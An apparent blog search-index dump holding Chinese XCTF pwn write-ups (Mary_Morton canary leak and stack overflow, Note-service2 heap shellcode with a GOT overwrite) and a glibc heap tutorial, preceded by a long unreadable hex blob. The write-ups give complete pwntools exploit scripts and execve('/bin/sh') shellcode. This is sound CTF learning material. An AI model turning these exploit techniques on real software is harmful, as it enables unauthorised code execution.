34f042515f76e24c142b888e25f69dc566798133d05c5dad593d7ce14ce49e632b8908c3b86ab50d145bf9f17619706d3369e89af2a50bbd0de892cd788eeb85b192180565e58840fb893cd4db9dc4dccd3aafdbbc597abbb384fb9938611dbab51373b2fa5b495be68e1a1642c757c5060fe818086d6baf7b3c768d127e3c8083227152bcde2c3ed269f23493812705ae6a6b1f8837eb12e7587bfa657c53ea2285a0c459f5e224e3be1d176d53a15f36ace6cd27388672a8df35b80666a1bc8d3b95177e6ccbdf338aeea46cd963abf2f168fd76c0415e077aa8174a54e6ccbbe794a1578865fc8fffcd6a48dec25640bd220b2748e6a05b56aedf3723a50eaf4d865188d681b3d919a9a29c13f7bcff1d59984b02890c2f49546faede27b06a7afeba70db91a20405f38974edb7ca3c2f7241941926e38d3c032ca506063ec7e8f9d31007f6fd982380c71408e2653ea04f7a5af7e36e1950f798817d8cda34275a5a25a70f1b1ac2c338ad6f93c2f63c39274c4df75486b70acd3fc01d98812449e934c6e24e59e07d0f073eff046d699a0e5165fcfc6d2c16a46c3a6581181ad451ef42cb959c52e9245118c45ca6d3afd4da6aa1cf56b679f4d46d57772e2dd3e4535cb04f7e0e00673f2d0492441ec2823236660bc1ba7937c9e0ffb92306f5e3ddeff9485c9621cb5b0042d084c4e47e6b0b37d09a5c99be813814c7873933ca9929be6fb1baad488ae509487f96d03dbac25f24dd153cc10a71585653f281c3065a233978ac3f2db866cd5b13b8db3d8a560b61168ecb8fcaaf9e027f7b2cab7362184357d17cda0a5b6418758598b9f95c3873e3735bbf75c81dc40196af4fa92c78117a4d63399cc027c8f899479a93ab4f1f3288f683229afa099dcb31018e6065c8c4d62847491d633c609e2fd069410b2bfedc6bfb0a571d99b018f6035b56c739c6c0229cda4f3174dc10f7808312fed1db009be947c00cef72ba88bbc9827e358f1db4305c64c2ab368294a21bb8f5bdd875c997925cb6e48dfe27bf8c44cf8aac23eea9f8fb9ddf38d56cca711e77843d644075c8f8c57f1f2a4a544d7ef963e7e17a8aeafd775c6fe218f07f38cbc291130ee1d5d91118cae18338542eb128b945791cf04f2f8903be6948ec55f128c39296a5af36563036c68f6ba30870a8e4b73c10c7331bb8d4dd9f5308f01aa33ddcfdf2ba49ffd83fa467a7c940a21b866dd8b428c6904eef0ee55c0065381673326d6ac939a5e868c1fb5160fc9eeaf3a2b4ca328a95c1044ceb9e2a2f04a805caa9224ca3494b331dfa21ffa3a5f55efee93624a9b90654e35beb6faa23f803d01243b9fb9068bf785d83d30240d52ac414fd9ad9aa07b5649805f79988a0afcf35ce8091ec94a7effe4d276fbac23d2801e642e9335ed2b84d2883c40cead235c2dd371e3f7ae0b3ca989e2017fb7fea2ed90ecc47149b0068f00c356360874579d4d42d06017f11586f2f21c9300985f1dee5c387c0c0b39a9be795672dd1a70e55640dc1be29c4ebedfd56dacba0b63a21df80bbae7bd19835d04bf6d9470ccfb295c355df670f8d826fff49dff9d96e63b918cc826faa94da2d664dd5c743efa9c50ca9d75b5fed5fb711d2ef6f9cd713eafa0d4cad54711a0d65b0ca95dd16a870d6577742f7430e3922b5e125e7ade00e90164ec1f8645e783e5fb14cbd309852de1cadd729260f42da3f662768c51356f81bcfa5c67b188b1343e275c9e89aae17de8e2a1a83736f61c01004ee953f3af82d0f2a4c3ed0a8efaf3fd12fb0567013997e05a7e3ed1701b3c9496b64d7b720c2f2b968d21aca48d09b39efac41a8b6676b82e016540e6e5dcf98a8e1abedb98cf3848b69237503af6cb05154bedd4ee121b6701f55cc325ed33573794703d58913d48d05432167f764053f010b4ece2411965ecee024953d3d7a4772ecfcab67dac0c4f56a4681aeccf878a4b478942737d3988d7dc1f95f67f8d41a27f93032f4d58262c930e8dd9d24e8cb5c0159a563f9add806a6cd23af9226bc48ad4a07a237f89edb234d6df799eb47f46c9491bbcdbdc2c2ba4a00a377ca5f061608770c86862a65fd9261200dcc2dc846487373a443c3a216f25f06f5b89072b662db8f2cd5353653c752e15a932e894fa2811cb3cf02241173a2f051eff600fa0eef387fb01a481fc03df92d4e6eeb8d81d32271077e50f89f6ba8076e9ab1b90165af27916b06a1867c2ecbabe75523aa8f07c8ac6f9f2c09f000edcf7378a380531ac5fbd69069671bb8c88966d5a16cf5a9afd61e06df4bbdd97bcada577a309d4e27db260b1d5eefa067dca9a95be82ce4492378f729af5c32041a796336ff0a79ff6e4d10741a8151c17daecddaacb40f4478c4e1d29aefa1f0d697598fa38e4407e591e855b409b24766055ee34c56c53be20494badb1fadb14e095214caf7c84fc32378d68f0af181a2e391c7e73d1404f6661e53a1f2b2c86ec25b0c3d6b8396c79de81fcd5d46a87ad4201c3d922079d473a4803836bfa995b419c9a34423e1a53b7a5ebbdc5e22e3d1d6461eba7133c5d0f69b551bef8c303048ff08dd70f09efebae5f5f8a0fd1fbddbb8d215839c91f57c58aac3b7c873dc9122feeba28e841936928dfe9e55bfee9b7cc9fdad2a159cf0392d938d36925da7c7aa0d35e148b37e321b76bafb8431f4dead80ffde4368208001bad420e7f7b615774c6c15749295b68302fc14ac4b0dd9091c693e51e493f03291648d59e9d2dc14cd288bc0fb44040af9d61594065fe5e2bfc5d1d0983a36846c50d5ee4d1178ed5172b05743cbab24761b94a967acde580f587cf75ee9d74480dae34366681dd86147f3cfb2006aa5b458da8ff512bd8e266a8e3d1d655b9b751806792f14559388d34de5d4eb30ff3acb64417c918d2a3e65409218b55c0cc8e683734e1fbd073d2f8cec8f3749160e521c2220b28fb2caeee0435a4d6425fb236ef18994c7e291a75b7265648f4a0f7c4ae80256eb1fc16bf9385901aca495bd15d5cfbee76f8965a6c2bea84e116030708791bcf87b61a4ca5014168ae879107327da9e4e8466fd8e6aea0edf7c46c8bb20926fd546206b7ecd2a0a87d500fe448756b74fa9544158e614631549f3f9ba0aca7aeb26bbb4e51af976c39d96fa0dacd1154790c59eb939859ce14286aad8475a692ddca7c2e6d4218c3210b90dbbcd4bd9e169b7a85bb41abd0e7c0cee937cee08fc137e41d45f07909bef64ed12ecd9c9bb1f7b4d26106fb529373edc73bae38968c636e3c9312255f964c3ade78be0ce90d949f0eb99d8c39fef06e18ced6db36185eaaed0d73416506dc3b16de445f5952e5214ecaf615beb9b81de65bdef429d3bc9bef7c13266a47d2eace4f15999ad48393b06bedd992a3df79a5b01246704381043b442007a5987c50a036600da9ad1c2e6369acce55adb6a3435a55de39d24bcac32a42e06ea06c8ceab2b45979685d204145f03e6c088dd0fc358bf3b61417aa95d7b43cbf3ab491bc74813dc63f0c64398c78b5b7acdabdb5a5bf8b4fd403fc26eff44e9de2e901986c3bfb9e9cfe7352099a3b1fdc356e94320d439d14ce12b5b132190d5ad9e88be12d0433d063099b87c58cb62e48847f528543f5631169b7b54a0f313b67996df7f029a13e8247125a32c2a82b2c78854629de80c3d3d20054ee401413cc8eea65ce9e032107ae0273706567acb84433bce0c6c084979cc2cb90dd18a66be53d5f3c6e1178943947934bedda3901551547ea2758e0e47095eefd1e681a877a40f75b8ebc74b65c174932da93d4f97eb1b4a855c28dc0a8515cf53f92d07908875e634fb24881afcfb1bb0c6b27a22adec838b8d1237d93eeaf0e97cb10e16be63b342bf434eae51b515c7fdb2121b1c2b0a10fbd31ba6cb75c5bc51dcbcc1d0b1309487a9dbfafb920a2669730f484e6f55453b09b20cf9d07f71a52429c704fcf37724352098865d4b09416889bc492bfa1817b470faf39cb37ae809c96ba5577e0acc62acd09ad91589d8422ff60645e14e55227412e4ce2d4082f1ba5daad1a06c5a4e1a6c604cfa9523c252e4b15750175e78d3adbb12c2b305e4dce893961c5413ddb64b85d2fad80aa25c45a5aacb3e5d5f6b9752b2f518add44da4ffe597cc7a2dd1dabd040b55e08da1fdae4954054abd3a6dab5eb06352917dc4b8659cd2801d82577f979f71c96ffee06c1605d4387e978df5a02d780f99b84655b2c0dfb5fb908d0aefcdbb657ca5eba34b9c835bdf193afe4c8d75af34a8cf50179495d05eebcf889023c38243c612ee20fb64091052a58b6f8e3da55693a7c075396776b8733faac1600cc8628850b669fc78dd1e1414665352310b042272f8fa370bd88ecae0c9090bda32125aa333d2a26683d6f764dc1540da6e0bcbe938017119c04a9a341cba8c1122bcb2f0654ed47988d50c0730f373c398fd4ea8c5d8bcdefc44437782fa0f2125d34c3d478a9e44279889f50c7b9d6462cd6477e606ee28e7e1405395670799207fa13bad33f2f8e7ec40a809089755b7e940b900b32e19572895c54aab98061afedd153aaec4eea2182d2b873383c4ed0267f3393b405eb6449ad01dfffdc65a96c25f4497e6f7d0db63b59a8b044465a677c4606ba7e1f6dbfdb5bfcda148c032423097a4a8e8b0d27cc43368fa5e69a90a320a56b1a30234557c217d48dabc99fdaab4b371847af495ac31c6ec943477f53a70d5d03ea1be15296273fafb5f02dfacb5dd79a27]]></content>
  </entry>
  <entry>
    <title><![CDATA[【XCTF-Pwn:Mary_Morto】非常简单的热身pwn（ps：我还真信了）]]></title>
    <url>%2F2020%2F07%2F19%2F2020.07.19%EF%BC%88138%EF%BC%89%2F</url>
    <content type="text"><![CDATA[0x00 相关知识点 格式化字符串的利用 金丝雀的绕过 栈的溢出 0x01 分析题目 既然题目说是个非常简单的热身的pwn，那我就简单的热一下身 1.file mary 12# file marymary: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=b7971b84c2309bdb896e6e39073303fc13668a38, stripped 该文件是一个64位的ELF可执行文件 2.checksec mary 1234567# checksec mary[*] &apos;/root/Documents/CTF/PWN/XCTF/pwn/2/Mary_Morton/mary&apos; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) 可以看出开启了金丝雀保护和栈不可执行保护，因此我们可能需要对金丝雀进行绕过 3.试运行程序 从上图可以得知，该程序有两个选项：栈溢出和格式化字符串漏洞，那说明选项1可能有栈溢出的风险，选项2可能有格式化字符串漏洞的风险，这是我们试运行程序得到的信息，下面我就看看该程序的伪代码。 4.获取程序的伪代码 上图是程序选项为1时的伪代码，可以看出该模块是有栈溢出漏洞的危害 上图是程序选项为2时的伪代码，可以看出该模块有格式化字符串漏洞 0x02 解题思路 从上文对题目的分析以后，我们可以有一种利用思路是： 通过格式化字符串漏洞将Canary泄露出来 再通过选项1的栈溢出执行shellcode 下面我们看看怎么写exp脚本： 1.泄露canary 通过上图可以看出，我们输入的AAAAAAAA，距离格式化字符串有6个位置，但是去掉前5个寄存器的位置，那么就是格式化字符串和buf的位置相邻，那么下面我们确定一下金丝雀的位置： 可以从上图看出，金丝雀的位置为rbp-0x8，因为buf的距离rbp的位置有0x90，所以我们可以得出buf距离 Canary有0x88，也就是0x88/8=17个地址单位，那么距离格式化字符串有17（buf到canary的距离）+5（5个寄存器）+1（canary本身）=23个单位，如下图所示： 那么我们可以将格式化字符串设置为%23$p，下图是运行程序时输入的%23$p，输出结果为0x2c3bceda73691600，从后两位可得这是canary，那么我们就成功的把金丝雀泄露出来了。 2.栈溢出 上图中的buf可以输入的空间大小有0x100，而buf到ebp的距离却只有0x90，所以说这里存在着栈溢出的漏洞，但是有因为有canary，所以利用方式如下图： 123456789# ROPgadget --binary mary --string &quot;system&quot;Strings information============================================================0x0000000000400464 : system# ROPgadget --binary mary --string &quot;flag&quot;Strings information============================================================0x0000000000400b36 : flag 从上面的搜索结果中可以看出，该程序中里面包含“system”和“flag”的，下面我们就在IDA中搜索一下位置，看一下是否有可以直接利用的shellcode，若然还真有，如下图： 地址为0x4008DA，下面我们就可以构造exp了 0x03 exp 选项2泄露canary，选项1进行栈溢出 123456789101112131415161718192021222324252627282930313233#! python3#! /usr/bin/env python#! coding: utf-8from pwn import *r = remote("220.249.52.133",36580)context(log_level="debug")system_addr = 0x4008DAdef start(): r.sendlineafter("3. Exit the battle","2")def format_string(): payload1 = "%23$p" r.sendline(payload1) r.recvuntil("0x") canary = int(r.recvuntil("\n")[:16],16) print("[*] The value of Canary is",canary) return canarydef overflow(canary): r.sendlineafter("3. Exit the battle","1") payload2 = (0x90-0x8)*"a" + str(p64(canary),encoding="unicode_escape") + "a"*8 + str(p64(system_addr),encoding="unicode_escape") r.sendline(payload2)if __name__ == "__main__": start() canary = format_string() overflow(canary) r.interactive()]]></content>
      <categories>
        <category>Binary</category>
      </categories>
      <tags>
        <tag>XCTF</tag>
        <tag>pwn</tag>
        <tag>栈相关题目</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【XCTF-Pwn:Note-service2】在堆上执行shellcode]]></title>
    <url>%2F2020%2F07%2F18%2F2020.07.18%EF%BC%88137%EF%BC%89%2F</url>
    <content type="text"><![CDATA[0x00 基础知识 1.什么是shellcode shellcode是一段用于利用软件漏洞而执行的代码，shellcode为16进制的机器码，因为经常让攻击者获得shell而得名。shellcode常常使用机器语言编写。 可在暂存器eip溢出后，塞入一段可让CPU执行的shellcode机器码，让电脑可以执行攻击者的任意指令。 ——维基百科 2.shellcode的C语言形式 12345678910#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;int main(int argc, char *argv[])&#123; char *code[2]; code[0] = "/bin/sh"; code[1] = NULL; execve(code[0], code, NULL); return 0;&#125; 再将上述代码进行简化： 1234567#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;int main(int argc, char *argv[])&#123; execve("/bin/sh",0, 0); return 0;&#125; 3.shellcode的汇编形式 将上述代码进行编译，然后在反汇编，就可以看到其汇编代码，如下：（只关注main函数的） 123456789101112131415160000000000001135 &lt;main&gt;: 1135: 55 push %rbp 1136: 48 89 e5 mov %rsp,%rbp 1139: 48 83 ec 10 sub $0x10,%rsp 113d: 89 7d fc mov %edi,-0x4(%rbp) 1140: 48 89 75 f0 mov %rsi,-0x10(%rbp) 1144: ba 00 00 00 00 mov $0x0,%edx 1149: be 00 00 00 00 mov $0x0,%esi 114e: 48 8d 3d af 0e 00 00 lea 0xeaf(%rip),%rdi # 2004 &lt;_IO_stdin_used+0x4&gt; 1155: e8 d6 fe ff ff callq 1030 &lt;execve@plt&gt; 115a: b8 00 00 00 00 mov $0x0,%eax 115f: c9 leaveq 1160: c3 retq 1161: 66 2e 0f 1f 84 00 00 nopw %cs:0x0(%rax,%rax,1) 1168: 00 00 00 116b: 0f 1f 44 00 00 nopl 0x0(%rax,%rax,1) rax 保存系统调用号#59，这是execve的调用号 rdi 保存execve的第一个参数，是&quot;/bin/sh&quot;的地址 rsi 是指向前面用到的&quot;/bin/sh&quot;的指针开始并以空指针结尾的指针数组 rdx 是零，用来做execve的第三个参数 execve的原型是：int execve(const char *filename, char *const argv[],char *const envp[]); 在很多题目中对输入的长度有限制，上述的shellcode就显得不起作用了，所以还需要精简shellcode，如下： 12345mov rax,0x3b mov rsi,0mov rdx,0mov rdi,XXX # rdi代表的是“/bin/sh”的地址syscall 这是针对64位的，但是这种字节码就要比32位下的长很多，因为0x3b只需要占8个bit，所以将rax改为eax也可以，并且还减少了字节的长度，其他命令也是如此，rdi有点特殊，大家可以想一下。 4.jmp *** 命令 0x01 解题思路 1.file pwn 123# file pwnpwn: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=6c3a706907441fd73514dbca2d692e7a7c9139aa, stripped 可以得到该文件是一个64位的ELF文件 2.checksec pwn 123456789# checksec pwn[*] &apos;/root/Documents/CTF/PWN/XCTF/pwn/2/note-service2/pwn&apos; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX disabled PIE: PIE enabled RWX: Has RWX segments 可以看出NX没有开启保护，并且Has RWX segments说明栈和堆上的代码可执行，也就是说我们可以将我们的shellcode放入栈中，然后进行执行，除此之外开启了地址无关代码，以及金丝雀保护。下面看看伪代码： addNote函数 从上图中可以看出，程序并没有对qword_2020A0[v1]数组的下标进行检查，从而可能导致在任意地址上进行读写操作，甚至可能改变got表中的值。从上图还可以看出，我们只能申请8字节大小的堆空间，那么我们能输入的content有多大呢？下面我们就看一下sub_B69((__int64)qword_2020A0[v1], v2);函数，如下图： 从上图中可以看出，我们能往chunk中输入的字符最多有7个字节，所以说我们上文所说的shellcode就无法全部输入进去，那么我们是否可以将这些shellcode分别输入到不同的chunk，然后用jmp命令将这些shellcode连接起来呢？首先我们来确定shellcode的划分： mov eax,0x3B：5字节 mov esi,0：5字节 mov edx,0：5字节 syscall：2字节 “/bin/sh”的值可以通过程序的输入进行输入，在这里我们用atoi()函数，我们看一下第一次执行atoi函数的汇编： 通过上图可以看出，如果输入的是&quot;/bin/sh&quot;，汇编代码会自动将其地址放入rdi中，所以无需我们自己再构造指令了。 3.确定jmp的距离 上面已经得到要输入的shellcode了，但是每个chunk中的shellcode怎么连接起来呢？这就需要我们的jmp short指令，这是一个相对近址跳转指令，我们来看看它的原理是什么，如下图： 如上图，看地址为0xE94和0xEA0处的汇编指令，都是jmp short loc_ED1，那么jmp是怎么跳转到的呢？下面看上图中的右半部分，可以看出地址为0xE94的指令的字节为：EB 3B，而地址0xEA0的指令的字节为：EB 2F，它们都是跳转到地址为ED1处，来计算一下是怎么跳转的： 0xE94：0xe94+0x3b = 0xecf，0xecf+2 = 0xed1 0xEA0：0xea0+0x2f = 0xecf，0xecf+2 = 0xed1 也就是说要得到目标地址那么就是jmp指令距离函数loc_ED1的距离2F，那么在堆中的跳转距离是多少呢？下面画一个示意图来说明一下，如下图： 由此看来jmp short xxx中的xxx的值是该命令行结束后的地址，即图中的0x1017地址，到要执行命令的起始位置，即图中的0x1030位置，所以我们可以得到jmp结束后的地址到下一个chunk用户数据处的地址的距离为：1+8+8+8 = 25(0x19)，为什么是这样的，可以看上图的实例。 4.确定解题思路 通过上述的分析，我们确定了如下的解题思路： 将我们的shellcode布置在几个不同的堆块上，如下图： 根据上图是可以看到，我们可以通过数组下标溢出，将atoi的got表的值改为我们申请的第一个块的地址，但是如果一开始就修改atoi的got表，那么在后面的程序运行中会出现错误，所以我们在最后修改atoi的got表地址，而且必须放在chunk的最前面，因为这样才能形成一个完整的控制流，那么我们如何操作呢？我们可以利用uaf的技巧，这是因为该程序在释放空间时没有将指针置为NULL，当我们释放了第一个chunk，然后再申请一个相同大小的chunk，进行重复利用，从而修改atoi的got表地址；其他的chunk即按照正常的顺序申请即可，申请流程如下： 从上图可以看出，我们就可以写出完整的exp 0x02 完整exp 123456789101112131415161718192021222324252627from pwn import *r = remote("220.249.52.133",40709)context(log_level="debug")elf = ELF("pwn")def addNote(r, index, size, content): r.sendlineafter("your choice&gt;&gt; ","1") r.sendlineafter("index:",index) r.sendlineafter("size:",size) r.sendafter("content",content)def deleteNote(r, index): r.sendlineafter("your choice&gt;&gt; ","4") r.sendlineafter("index",index)addNote(r,"0","8","a"*7)addNote(r,"1","8",asm('xor rsi,rsi',os="linux",arch="amd64") + b'\x90\x90\xeb\x19')addNote(r,"2","8",asm('xor rdx,rdx',os="linux",arch="amd64") + b'\x90\x90\xeb\x19')addNote(r,"3","8",str(asm('syscall',os="linux",arch="amd64"),encoding="unicode_escape").ljust(7,'\x90'))addNote(r,"4","8","/bin/sh")deleteNote(r,"0")#addNote(r,str((elf.got["free"]-0x2020A0)//8),"8",asm('xor rax,rax',os="linux",arch="amd64") + b'\x90\x90\xeb\x19')#addNote(r,"2","8",asm('mov eax,0x3B',os="linux",arch="amd64") + b'\xeb\x19')addNote(r,str((elf.got["atoi"]-0x2020A0)//8),"8",asm('mov eax,0x3B',os="linux",arch="amd64") + b'\xeb\x19')r.sendlineafter('your choice&gt;&gt;','/bin/sh') r.interactive()]]></content>
      <categories>
        <category>Binary</category>
      </categories>
      <tags>
        <tag>XCTF</tag>
        <tag>pwn</tag>
        <tag>堆相关题目</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[由浅入深的剖析堆]]></title>
    <url>%2F2020%2F07%2F13%2F2020.07.13%EF%BC%88136%EF%BC%89%2F</url>
    <content type="text"><![CDATA[123456789#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int main(int argc,char* argv[])&#123; char *ptr; ptr = malloc(50); free(ptr); return 0;&#125; 只要学过C语言的同学想必都申请过堆内存吧，那么大家是否真正了解申请堆和释放堆后面的机制吗？今天我就带领大家一步一步的来了解，先在这里留一个问题：上述代码是否有漏洞？以后会慢慢的揭开这个答案，本文均是在64位下进行的实验。 0x00 什么是堆？ 在计算机科学中, 动态内存分配（Dynamic memory allocation）又称为堆内存分配，是指计算机程序在运行期中分配使用内存。它可以当成是一种分配有限内存资源所有权的方法。动态分配的内存在被程序员明确释放或被垃圾回收之前一直有效。与静态内存分配的区别在于没有一个固定的生存期。这样被分配的对象称之为有一个“动态生存期”。对堆操作的是由堆管理器（ptmalloc2）来实现的，而不是操作系统内核。因为程序每次申请或者释放堆时都需要进行系统调用，系统调用的开销巨大，当频繁进行堆操作时，就会严重影响程序的性能 简而言之，堆就是程序员动态分配的一个内存空间，它在进程内存中的分布如下： 图1 从上图可以看出堆是由低地址向高地址生长的，这一点必须要清楚。虽然程序可以请求一块连续内存，并自由地使用，但是还应清楚：堆在内存空间中不一定连续。 下面我们运行一下上述的代码，在main函数打个断点，当运行完call malloc后，该函数会返回给寄存器eax一个值，这个值就是动态申请的返回的指针ptr。 图2 从上图可以看出返回的地址为0x5555555592a0，对于chunk来说这只是user_content的开始，不是chunk的地址，这块后面会详细讲解。 图3 从上图中可以看出，在执行malloc之后在程序的虚拟内存空间中映射了一个heap区域（有关虚拟地址的映射我会在后期在单独写一篇），也就是说这个时候堆已经分配成功了，那么我们计算一下映射的堆的大小是多少：0x000055555557a000- 0x0000555555559000=0x21000（132KB），下面我们进行验证，看一下堆中的情况，如下图： 图4 如上图所示，执行完malloc后会有三个堆块，在这里先不说这些堆块的意义，只是计算一下它们的合计大小：0x290+0x40+0x20d63=0x21000，验证成功。在这里留几个问题： 【图一】返回的chunk指针为0x5555555592a0，为什么在heap看到的起始地址却是0x555555559290？ 【图一】我们申请的堆大小为50，为什么分配的堆块确是0x40（64）？ 【图二】我们只申请了大小为50个字节的堆空间，为什么给我们分配了132KB大小的堆空间？ 【图三】我们只申请了一个堆块，为什么堆空间中有三个堆块？ 下面我们还不会讲malloc背后的原理，让我们带着这些问题走进堆的学习。 0x01 Chunk讲解 首先来看chunk的结构，下面给出chunk的源码： 1234567891011121314/* This struct declaration is misleading (but accurate and necessary). It declares a "view" into memory allowing access to necessary fields at known offsets from a given base. See explanation below.*/struct malloc_chunk &#123; INTERNAL_SIZE_T mchunk_prev_size; /* Size of previous chunk (if free). */ INTERNAL_SIZE_T mchunk_size; /* Size in bytes, including overhead. */ struct malloc_chunk* fd; /* double links -- used only if free. */ struct malloc_chunk* bk; /* Only used for large blocks: pointer to next larger size. */ struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */ struct malloc_chunk* bk_nextsize;&#125;; 从官方给出的源码中可以看出，chunk有两种结构，分别是malloced chunk和freed chunk，下面根据源码中的数据结构给出两种chunk的结构示意图，在这里给出的是64位下的，对齐字节为16字节。 图5 注释： prev_size：当标志位p=0时，表示前面的chunk处于free状态，这时这里表示的是前一个chunk的大小；当p=1时，表示前面的chunk处于malloc状态，这时这里的数据可以被前面的chunk复用，下面会有例子说明； size：当前整个chunk的大小 user content：用户申请的大小 A/M/P：标志位 A：A=0 为主分区（main_arena）分配，A=1 为非主分区分配 M：M=0为使用heap区域，M=1表示使用mmap映射区域 P：P=0 表示pre_chunk空闲，mchunk_prev_size才有效，P=1表示pre_chunk在使用中，prev_size被pre_chunk复用 fd：前一个堆块的地址（不是返回给用户的地址哦），只有chunk处于free状态时才有用，否则只是表示用户数据 bk：后一个堆块的地址，只有chunk处于free状态时才有用，否则只是表示用户数据 fd_nextsize： Only used for large blocks: pointer to next larger size bk_nextsize：Only used for large blocks: pointer to prev larger size 有了上述的知识储备，那么我们就可以来回答第一个问题：返回的chunk指针为0x5555555592a0，为什么在heap看到的起始地址却是0x555555559290？我们从图5中可以看到，我们申请的堆空间只是user_content部分，而chunk真正的起始地址应该是指向prev_size的部分，所以chunk的起始地址应该为返回给用户的地址-0x10=chunk的起始地址，那么我们也就解决了第1个问题：0x5555555592a0-0x10 = 0x555555559290 0x02 main_arena 这里就是要回答第二个、第三个和第四个问题。在上述例子中，我们申请了50bytes大小的堆，操作系统却给我们申请了132KB大小的堆空间，这是为什么呢？首先在这里先向大家引入一个概念：main_arena，如下图： 图6 main_arena是由主线程分配的堆空间，main_arena中含有多个chunk，也就是返回给我们申请的堆的地址。因为132KB远远大于50B，所以如果主线程后续再申请堆空间的话，就会先从这132KB的剩余部分进行申请，直到用完或不够用的时候，再通过增加program break location的方式来增加main arena的大小。同理，当main arena中有过多空闲内存的时候，也会通过减小program break location的方式来缩小main arena的大小。[1] 通过上述的介绍，我想第三个问题已经被解决了，下面开始第二个问题：我们申请的堆大小为50，为什么分配的堆块确是0x40（64）？通过上图我们可以看出，我们申请的50B大小的chunk，只是user_content部分的大小，所以真正的chunk大小应该是0x8(prev_size)+0x8(size)+50=66Bytes，但是从第2张图片中我们看到系统却只给我们64KB，这是为什么呢？还记得上一节中讲的chunk的标志位吗？当p=1时，则表示pre_chunk在使用中，prev_size被pre_chunk复用，对！这里就是这个意思，也就是说我们申请的堆块有2字节被放在了next chunk的prev_size字段中，下面我们可以写个程序验证一下： 1234567891011#include&lt;stdio.h&gt;#include&lt;string.h&gt;#include&lt;stdlib.h&gt;int main(int argc,char* argv[])&#123; char *ptr; ptr = malloc(50); memcpy(ptr,"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabb",50); // 48*"a"+"b" free(ptr); return 0;&#125; 在执行了mecpy函数后，我们看一下堆中的存储情况，因为我们输入的字符串长度为50，正好是我们申请的大小，所以这里没有堆溢出，那么现在预测一下chunk的user_content，应该都是&quot;a&quot;，next_chunk的prev_size部分应该是&quot;b&quot;，如下图： 图7 有关第二个问题，可以这样回答：因为我们申请的是50B大小的chunk，但是实际chunk的大小应该是：用户申请的大小+16+nextchunk可以被复用的部分-prevchunk被复用的部分 下面只有第四个问题没有解决了：我们只申请了一个堆块，为什么堆空间中有三个堆块？在这里需要在main_arena区域中引入两个新的概念：top chunk和（另外一个还没搞明白），如下图： 图8 从上图中可以看到，除了用户申请的chunk外的空间，处于高地址部分的为top chunk，该chunk并不属于任何bin，而是在系统当前的所有free chunk(无论那种bin)都无法满足用户请求的内存大小的时候，将此chunk当做一个应急消防员，分配给用户使用。如果top chunk的大小比用户请求的大小要大的话，就将该top chunk分作两部分：1）用户请求的chunk；2）剩余的部分成为新的top chunk。否则，就需要扩展heap或分配新的heap了——在main arena中通过sbrk扩展heap，而在thread arena中通过mmap分配新的heap。[1] 0x03 malloc机制 在linux平台malloc本质上都是通过系统调用brk或者mmap实现的，如下图： 图9 从操作系统角度来看，进程分配内存有两种方式，分别由两个系统调用完成：brk和mmap（不考虑共享内存）。 1、brk是将数据段(.data)的最高地址指针_edata往高地址推； 2、mmap是在进程的虚拟地址空间中（堆和栈中间，称为文件映射区域的地方）找一块空闲的虚拟内存。 这两种方式分配的都是虚拟内存，没有分配物理内存。在第一次访问已分配的虚拟地址空间的时候，发生缺页中断，操作系统负责分配物理内存，然后建立虚拟内存和物理内存之间的映射关系。 在标准C库中，提供了malloc/free函数分配释放内存，这两个函数底层是由brk，mmap，munmap这些系统调用实现的。[3] brk()函数 brk通过增加program break的位置（brk）从内核申请（非零值初始化的）内存。一开始，堆段(heap segment)的起始位置（start_brk）和结束位置(brk)指向同一个位置： 当ASLR（Address Space Layout Randomization）关闭时，start_brk和brk同时指向data/bss段的结束位置（end_data）。 当ASLR打开时，start_brk和brk同时指向data/bss段的结束位置（end_data）再加上一个随机的brk偏移。 上面的进程虚拟内存布局图展示了，start_brk是堆段的开始位置，brk(program break)则是堆段的结束位置。 malloc小于M_MMAP_THRESHOLD（默认为128KB）的内存[５]，使用brk分配内存，将_edata往高地址推(只分配虚拟空间，不对应物理内存(因此没有初始化)，第一次读/写数据时，引起内核缺页中断，内核才分配对应的物理内存，然后虚拟地址空间建立映射关系)，如下图：[4] 图10 进程启动的时候，其（虚拟）内存空间的初始布局如图10-(1)所示。 其中，mmap内存映射文件是在堆和栈的中间（例如libc-2.2.93.so，其它数据文件等），为了简单起见，省略了内存映射文件。_edata指针（glibc里面定义）指向数据段的最高地址。 进程调用**A=malloc(30KB)**以后，内存空间如图10-(2)： malloc函数会调用brk系统调用，将_edata指针往高地址推30K，就完成虚拟内存分配。 你可能会问：只要把_edata+30K就完成内存分配了？ 事实是这样的，_edata+30K只是完成虚拟地址的分配，A这块内存现在还是没有物理页与之对应的，等到进程第一次读写A这块内存的时候，发生缺页中断，内核才分配A这块内存对应的物理页。也就是说，如果用malloc分配了A这块内容，然后从来不访问它，那么，A对应的物理页是不会被分配的。 进程调用B=malloc(40K)以后，内存空间如图10-(3)。 mmap()函数 malloc使用mmap创建一个私有匿名的映射段。这个映射段的主要目的是申请一块（零值初始化的）新内存，这块内存处于栈和堆之间，并且这块内存只能被调用的这个进程独占使用。[4]当主线程malloc的大小大于128KB时以及子线程在申请动态内存时，会用到mmap来申请。 图11 进程调用C=malloc(200K)以后，内存空间如图11-(4)： 默认情况下，malloc函数分配内存，如果请求内存大于128K（可由M_MMAP_THRESHOLD选项调节），那就不是去推_edata指针了，而是利用mmap系统调用，从堆和栈的中间分配一块虚拟内存。 这样子做主要是因为：brk分配的内存需要等到高地址内存释放以后才能释放（例如，在B释放之前，A是不可能释放的，这就是内存碎片产生的原因，什么时候紧缩看下面），而mmap分配的内存可以单独释放。 当然，还有其它的好处，也有坏处，再具体下去，有兴趣的同学可以去看glibc里面malloc的代码了。 进程调用D=malloc(100K)以后，内存空间如图11-(5)； 